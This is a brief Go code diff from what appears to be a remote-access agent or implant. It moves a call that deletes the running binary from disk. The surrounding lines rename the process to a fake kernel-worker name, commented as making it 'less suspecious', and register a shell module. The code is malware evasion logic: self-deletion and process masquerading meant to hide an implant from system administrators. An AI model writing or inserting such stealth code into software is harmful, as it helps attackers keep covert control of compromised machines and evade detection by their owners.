@@ -67,7 +67,6 @@ func main() {
 
 	// rename our agent process to make it less suspecious
 	osArgs := os.Args
-	os.Remove(osArgs[0])
 	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
 		util.RandInt(1, 20),
 		util.RandInt(0, 6)))
@@ -81,6 +80,7 @@ func main() {
 				&buildinfo.Program{}, &lsp.Program{},
 				&shell.Program{})))
 	}
+	os.Remove(osArgs[0])
 
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
